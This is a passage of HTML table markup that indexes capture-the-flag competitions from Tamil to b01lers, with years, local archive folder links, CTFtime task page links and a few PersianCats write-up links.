href=\"ctfs/Tamil/2021\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1440/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=2><a href=\"ctfs/Tasteless\">Tasteless</a></td>\n            <td><a href=\"ctfs/Tasteless/2021\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1326/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/Tasteless/2020\">2020</a></td>\n            <td><a href=\"https://ctftime.org/event/1124/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/TeamItaly\">TeamItaly</a></td>\n            <td><a href=\"ctfs/TeamItaly/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/2088/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=2><a href=\"ctfs/Tenable\">Tenable</a></td>\n            <td><a href=\"ctfs/Tenable/2022\">2022</a></td>\n            <td><a href=\"https://ctftime.org/event/1668/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/Tenable/2021\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1266/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=5><a href=\"ctfs/TetCTF\">TetCTF</a></td>\n            <td><a href=\"ctfs/TetCTF/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2212/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/TetCTF/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/1842/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/TetCTF/2022\">2022</a></td>\n            <td><a href=\"https://ctftime.org/event/1540/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/TetCTF/2021\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1213/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/TetCTF/2020\">2020</a></td>\n            <td><a href=\"https://ctftime.org/event/955/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=3><a href=\"ctfs/TexSAW\">TexSAW</a></td>\n            <td><a href=\"ctfs/TexSAW/2025\">2025</a></td>\n            <td><a href=\"https://ctftime.org/event/2736/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/TexSAW/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2281/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/TexSAW/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/1959/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/TheCyberJawaraInternational\">TheCyberJawaraInternational</a></td>\n            <td><a href=\"ctfs/TheCyberJawaraInternational/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2552/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/TheHackerConclave\">TheHackerConclave</a></td>\n            <td><a href=\"ctfs/TheHackerConclave/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2575/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/TheOdyssey\">TheOdyssey</a></td>\n            <td><a href=\"ctfs/TheOdyssey/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/2029/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/ToH\">ToH</a></td>\n            <td><a href=\"ctfs/ToH/2025\">2025</a></td>\n            <td><a href=\"https://ctftime.org/event/2833/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=3><a href=\"ctfs/TokyoWesterns\">TokyoWesterns</a></td>\n            <td><a href=\"ctfs/TokyoWesterns/2020\">2020</a></td>\n            <td><a href=\"https://ctftime.org/event/1086/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/TokyoWesterns/2019\">2019</a></td>\n            <td><a href=\"https://ctftime.org/event/808/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/TokyoWesterns/2018\">2018</a></td>\n            <td><a href=\"https://ctftime.org/event/651/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/TrellixHAX\">TrellixHAX</a></td>\n            <td><a href=\"ctfs/TrellixHAX/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/1882/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/TrollCAT\">TrollCAT</a></td>\n            <td><a href=\"ctfs/TrollCAT/2021\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1257/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=2><a href=\"ctfs/TsukuCTF\">TsukuCTF</a></td>\n            <td><a href=\"ctfs/TsukuCTF/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/2169/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/TsukuCTF/2021\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1442/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=3><a href=\"ctfs/TyphoonCon\">TyphoonCon</a></td>\n            <td><a href=\"ctfs/TyphoonCon/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/1997/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/TyphoonCon/2022\">2022</a></td>\n            <td><a href=\"https://ctftime.org/event/1672/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/TyphoonCon/2021\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1390/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/UACTF\">UACTF</a></td>\n            <td><a href=\"ctfs/UACTF/2022\">2022</a></td>\n            <td><a href=\"https://ctftime.org/event/1709/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/UACWS\">UACWS</a></td>\n            <td><a href=\"ctfs/UACWS/2022\">2022</a></td>\n            <td><a href=\"https://ctftime.org/event/1674/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=7><a href=\"ctfs/UIUCTF\">UIUCTF</a></td>\n            <td><a href=\"ctfs/UIUCTF/2025\">2025</a></td>\n            <td><a href=\"https://ctftime.org/event/2640/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/UIUCTF/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2275/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/UIUCTF/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/1899/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/UIUCTF/2022\">2022</a></td>\n            <td><a href=\"https://ctftime.org/event/1600/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/UIUCTF/2021\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1372/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/UIUCTF/2020\">2020</a></td>\n            <td><a href=\"https://ctftime.org/event/1075/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/UIUCTF/2018\">2018</a></td>\n            <td><a href=\"https://ctftime.org/event/587/tasks/\" target=\"_blank\">CTFtime</a> <a href=\"https://github.com/sajjadium/ctf-writeups/tree/master/UIUCTF/2018\">PersianCats</a></td>\n        </tr>\n        <tr>\n            <td rowspan=5><a href=\"ctfs/UMDCTF\">UMDCTF</a></td>\n            <td><a href=\"ctfs/UMDCTF/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2323/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/UMDCTF/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/1949/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/UMDCTF/2022\">2022</a></td>\n            <td><a href=\"https://ctftime.org/event/1593/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/UMDCTF/2021\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1288/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/UMDCTF/2020\">2020</a></td>\n            <td><a href=\"https://ctftime.org/event/1040/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=3><a href=\"ctfs/UMassCTF\">UMassCTF</a></td>\n            <td><a href=\"ctfs/UMassCTF/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2287/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/UMassCTF/2022\">2022</a></td>\n            <td><a href=\"https://ctftime.org/event/1561/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/UMassCTF/2021\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1282/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=2><a href=\"ctfs/UNbreakableInternational\">UNbreakableInternational</a></td>\n            <td><a href=\"ctfs/UNbreakableInternational/2025\">2025</a></td>\n            <td><a href=\"https://ctftime.org/event/2739/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/UNbreakableInternational/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2297/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/USC\">USC</a></td>\n            <td><a href=\"ctfs/USC/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2543/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=7><a href=\"ctfs/UTCTF\">UTCTF</a></td>\n            <td><a href=\"ctfs/UTCTF/2025\">2025</a></td>\n            <td><a href=\"https://ctftime.org/event/2641/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/UTCTF/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2302/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/UTCTF/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/1919/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/UTCTF/2022\">2022</a></td>\n            <td><a href=\"https://ctftime.org/event/1582/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/UTCTF/2021\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1177/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/UTCTF/2020\">2020</a></td>\n            <td><a href=\"https://ctftime.org/event/929/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/UTCTF/2019\">2019</a></td>\n            <td><a href=\"https://ctftime.org/event/757/tasks/\" target=\"_blank\">CTFtime</a> <a href=\"https://github.com/sajjadium/ctf-writeups/tree/master/UTCTF/2019\">PersianCats</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/UUTCTF\">UUTCTF</a></td>\n            <td><a href=\"ctfs/UUTCTF/2021\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1471/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=2><a href=\"ctfs/Ugra\">Ugra</a></td>\n            <td><a href=\"ctfs/Ugra/2025/Quals\">2025 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/2693/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/Ugra/2024/Quals\">2024 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/1246/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/Ulisse\">Ulisse</a></td>\n            <td><a href=\"ctfs/Ulisse/2025\">2025</a></td>\n            <td><a href=\"https://ctftime.org/event/2735/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/Undutmaning\">Undutmaning</a></td>\n            <td><a href=\"ctfs/Undutmaning/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2283/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/Union\">Union</a></td>\n            <td><a href=\"ctfs/Union/2021\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1246/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=2><a href=\"ctfs/UofTCTF\">UofTCTF</a></td>\n            <td><a href=\"ctfs/UofTCTF/2025\">2025</a></td>\n            <td><a href=\"https://ctftime.org/event/2570/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/UofTCTF/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2219/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/UrchinSecAware\">UrchinSecAware</a></td>\n            <td><a href=\"ctfs/UrchinSecAware/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2527/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/UrchinSecTanzaniaNational\">UrchinSecTanzaniaNational</a></td>\n            <td><a href=\"ctfs/UrchinSecTanzaniaNational/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2327/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=2><a href=\"ctfs/UCTF\">UCTF</a></td>\n            <td><a href=\"ctfs/UCTF/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2460/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/UCTF/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/2067/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=2><a href=\"ctfs/VULNCON\">VULNCON</a></td>\n            <td><a href=\"ctfs/VULNCON/2021\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1469/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/VULNCON/2020\">2020</a></td>\n            <td><a href=\"https://ctftime.org/event/1149/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/ViettelMates\">Viettel Mates</a></td>\n            <td><a href=\"ctfs/ViettelMates/2018\">2018</a></td>\n            <td><a href=\"https://ctftime.org/event/629/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/VirSecCon\">VirSecCon</a></td>\n            <td><a href=\"ctfs/VirSecCon/2020\">2020</a></td>\n            <td><a href=\"https://ctftime.org/event/1032/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=6><a href=\"ctfs/VolgaCTF\">VolgaCTF</a></td>\n            <td><a href=\"ctfs/VolgaCTF/2025/Quals\">2025 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/2676/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/VolgaCTF/2024/Quals\">2024 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/2200/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/VolgaCTF/2021/Quals\">2021 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/1229/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/VolgaCTF/2020/Quals\">2020 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/933/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/VolgaCTF/2019/Quals\">2019 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/713/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/VolgaCTF/2018/Quals\">2018 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/539/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/VulnX\">VulnX</a></td>\n            <td><a href=\"ctfs/VulnX/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2318/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/WACON\">WACON</a></td>\n            <td><a href=\"ctfs/WACON/2023/Quals\">2023 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/2076/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/WATCTF\">WATCTF</a></td>\n            <td><a href=\"ctfs/WATCTF/2025\">2025</a></td>\n            <td><a href=\"https://ctftime.org/event/2727/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=3><a href=\"ctfs/WMCTF\">WMCTF</a></td>\n            <td><a href=\"ctfs/WMCTF/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2457/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/WMCTF/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/2061/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/WMCTF/2020\">2020</a></td>\n            <td><a href=\"https://ctftime.org/event/1094/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/WHY\">WHY</a></td>\n            <td><a href=\"ctfs/WHY/2025/Finals\">2025 Finals</a></td>\n            <td><a href=\"https://ctftime.org/event/2680/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/WHY/2025/Quals\">2025 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/2679/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/WORMCON\">WORMCON</a></td>\n            <td><a href=\"ctfs/WORMCON/2021\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1391/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=5><a href=\"ctfs/WPICTF\">WPICTF</a></td>\n            <td><a href=\"ctfs/WPICTF/2022\">2022</a></td>\n            <td><a href=\"https://ctftime.org/event/1743/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/WPICTF/2021\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1208/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/WPICTF/2020\">2020</a></td>\n            <td><a href=\"https://ctftime.org/event/913/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/WPICTF/2019\">2019</a></td>\n            <td><a href=\"https://ctftime.org/event/728/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/WPICTF/2018\">2018</a></td>\n            <td><a href=\"https://ctftime.org/event/600/tasks/\" target=\"_blank\">CTFtime</a> <a href=\"https://github.com/sajjadium/ctf-writeups/tree/master/WPICTF/2018\">PersianCats</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/WRECKCTF\">WRECKCTF</a></td>\n            <td><a href=\"ctfs/WRECKCTF/2022\">2022</a></td>\n            <td><a href=\"https://ctftime.org/event/1775/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=2><a href=\"ctfs/WaniCTF\">WaniCTF</a></td>\n            <td><a href=\"ctfs/WaniCTF/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2377/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/WaniCTF/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/1988/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/WannaGameChampionship\">WannaGameChampionship</a></td>\n            <td><a href=\"ctfs/WannaGameChampionship/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/2146/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/Wargames.MY\">Wargames.MY</a></td>\n            <td><a href=\"ctfs/Wargames.MY/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2597/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=2><a href=\"ctfs/WeCTF\">WeCTF</a></td>\n            <td><a href=\"ctfs/WeCTF/2022\">2022</a></td>\n            <td><a href=\"https://ctftime.org/event/1546/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/WeCTF/2021\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1231/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/WebArena\">WebArena</a></td>\n            <td><a href=\"ctfs/WebArena/2025\">2025</a></td>\n            <td><a href=\"https://ctftime.org/event/2939/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=3><a href=\"ctfs/Winja\">Winja</a></td>\n            <td><a href=\"ctfs/Winja/2025\">2025</a></td>\n            <td><a href=\"https://ctftime.org/event/2692/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/Winja/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/2094/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/Winja/2022\">2022</a></td>\n            <td><a href=\"https://ctftime.org/event/1603/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=2><a href=\"ctfs/WhiteHat\">WhiteHat Grand Prix</a></td>\n            <td><a href=\"ctfs/WhiteHat/2020/Quals\">2020 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/942/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/WhiteHat/2018/Quals\">2018 Quals</a></td>\n            <td><a href=\"https://ctftime.org/event/656/tasks/\" target=\"_blank\">CTFtime</a> <a href=\"https://github.com/sajjadium/ctf-writeups/tree/master/WhiteHat/2018/Quals\">PersianCats</a></td>\n        </tr>\n        <tr>\n            <td rowspan=4><a href=\"ctfs/WolvCTF\">WolvCTF</a></td>\n            <td><a href=\"ctfs/WolvCTF/2025\">2025</a></td>\n            <td><a href=\"https://ctftime.org/event/2579/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/WolvCTF/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2240/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/WolvCTF/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/1866/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/WolvCTF/2022\">2022</a></td>\n            <td><a href=\"https://ctftime.org/event/1612/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=2><a href=\"ctfs/WorldWide\">WorldWide</a></td>\n            <td><a href=\"ctfs/WorldWide/2025\">2025</a></td>\n            <td><a href=\"https://ctftime.org/event/2753/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/WorldWide/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2572/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=2><a href=\"ctfs/WxMCTF\">WxMCTF</a></td>\n            <td><a href=\"ctfs/WxMCTF/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2179/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/WxMCTF/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/1911/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/BxMCTF\">BxMCTF</a></td>\n            <td><a href=\"ctfs/BxMCTF/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/2004/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/XCTF-DubheCTF\">XCTF-DubheCTF</a></td>\n            <td><a href=\"ctfs/XCTF-DubheCTF/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2279/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=4><a href=\"ctfs/X-MAS\">X-MAS</a></td>\n            <td><a href=\"ctfs/X-MAS/2022\">2022</a></td>\n            <td><a href=\"https://ctftime.org/event/1787/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/X-MAS/2021\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1520/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/X-MAS/2020\">2020</a></td>\n            <td><a href=\"https://ctftime.org/event/1209/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/X-MAS/2018\">2018</a></td>\n            <td><a href=\"https://ctftime.org/event/724/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=1><a href=\"ctfs/Zh3r0\">Zh3r0</a></td>\n            <td><a href=\"ctfs/Zh3r0/2021\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1285/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=7><a href=\"ctfs/angstromCTF\">angstromCTF</a></td>\n            <td><a href=\"ctfs/angstromCTF/2024\">2024</a></td>\n            <td><a href=\"https://ctftime.org/event/2375/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/angstromCTF/2023\">2023</a></td>\n            <td><a href=\"https://ctftime.org/event/1859/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/angstromCTF/2022\">2022</a></td>\n            <td><a href=\"https://ctftime.org/event/1588/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/angstromCTF/2021\">2021</a></td>\n            <td><a href=\"https://ctftime.org/event/1265/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/angstromCTF/2020\">2020</a></td>\n            <td><a href=\"https://ctftime.org/event/982/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/angstromCTF/2019\">2019</a></td>\n            <td><a href=\"https://ctftime.org/event/774/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td><a href=\"ctfs/angstromCTF/2018\">2018</a></td>\n            <td><a href=\"https://ctftime.org/event/577/tasks/\" target=\"_blank\">CTFtime</a></td>\n        </tr>\n        <tr>\n            <td rowspan=6><a href=\"ctfs/b01lers\">b01lers</a></td>\n            